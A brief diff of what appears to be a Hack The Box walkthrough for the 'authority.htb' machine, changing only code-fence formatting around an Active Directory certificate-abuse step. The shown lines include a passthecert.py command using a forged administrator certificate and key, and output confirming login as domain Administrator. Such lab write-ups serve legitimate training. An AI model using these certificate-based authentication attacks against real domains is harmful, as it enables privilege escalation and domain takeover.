@@ -83,7 +83,8 @@ An attacker with a user or machine account with an enrollment right would reques
 ```[*] Writing private key to 'administrator.key'```
 ## authentication using passthecert.py
 ```python passthecert.py -action whoami -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -new-pass password```
-```Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+```
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] You are logged in as: HTB\Administrator
 ```
